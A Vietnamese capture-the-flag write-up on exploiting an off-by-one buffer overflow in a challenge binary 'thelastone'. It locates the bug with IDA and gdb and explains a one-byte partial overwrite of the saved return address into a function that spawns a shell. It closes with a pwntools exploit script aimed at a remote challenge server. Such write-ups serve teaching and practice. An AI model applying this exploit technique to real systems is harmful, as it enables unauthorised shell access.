**1. Find bug**
- Mở ida để xem qua chương trình:
  + ![image](https://user-images.githubusercontent.com/113702087/212825794-781e3d14-6d17-4171-94a2-cacb4917f900.png)
  + Xem qua các ham ta thấy hàm unknown thực thi system("/bin/sh") đây sẽ là mục tiêu ta cần
  + ![image](https://user-images.githubusercontent.com/113702087/212825932-fb2bc207-b383-400a-ad14-72a389992030.png)
  + Và find_survivor() với read_str có bug overflow
  + ![image](https://user-images.githubusercontent.com/113702087/212826196-81824847-bd77-4cc4-9c18-2d1e32d87db7.png)
  + ![image](https://user-images.githubusercontent.com/113702087/212826244-f835c8cc-bbd1-4428-9421-fc8a47cd82e3.png)
  + read_str chỉ dừng nhập khi nhập newline hoặc i > size đã cho do đó ta có thể nhập hơn 1 byte.
- Debug với gdb:
  + ![image](https://user-images.githubusercontent.com/113702087/212826901-6e666d39-e4a2-41cc-bdf2-6f7494ff6a06.png)
  + đặt debug tại read_str và ret trong hàm find_survivor() để kiểm tra
  + ![image](https://user-images.githubusercontent.com/113702087/212827152-1c3d5b2d-210e-42ba-8150-05fe145b0d95.png)
  + địa chỉ v1 0x7fffffffdc90 và saverip = 0x7fffffffdce8, cách nhau 88 byte nhưng vs read_str(v1, 88); ta có thể nhập được 89 byte và overwrite saverip từ 0x40164a thành 0x40166f
  + ![image](https://user-images.githubusercontent.com/113702087/212828474-8a468bec-5295-4771-bca3-620eee90d836.png)
  + tức unknown+8 vì điều kiện thực thi system là rsp kết thúc = 0 khi thực thi push rbp stack sẽ bị giảm 8 byte -> không đủ điều kiện thực thi system và bị lỗi
  + nếu bắt đầu từ unknown+0 sẽ nhu này
  + ![image](https://user-images.githubusercontent.com/113702087/212829007-57ee7aa6-a3b5-409e-a8fc-67fc6cf0a461.png)
  + ![image](https://user-images.githubusercontent.com/113702087/212829089-7f7f9bf8-27df-4295-9675-1c389a9a27d5.png)
  + ![image](https://user-images.githubusercontent.com/113702087/212829118-971a2ac9-dd41-4249-a7ac-e380abdcce17.png)
  + ![image](https://user-images.githubusercontent.com/113702087/212829158-09d8bb7c-7597-4e09-987b-16ee3126a553.png)
 
**2. Exploit**
```
from pwn import *

exe = context.binary = ELF('./thelastone', checksec=False)

# r = exe.process()
# gdb.attach(r, api=True, gdbscript='''
#            b*0x00000000004014be
#            b*0x0000000000401519
#            b*0x0000000000401504
#            ''')

r = remote('159.89.197.210', 9995)

r.sendlineafter(b'> ', b'5')

name = b'a'*88 + b'\x6f'
r.sendlineafter(b'> ', name)

r.interactive()
```
![image](https://user-images.githubusercontent.com/113702087/212830005-6e0f8701-e156-4eee-8dcf-a800835c229a.png)
- vì có hàm rand nên phải nhờ may mắn =))
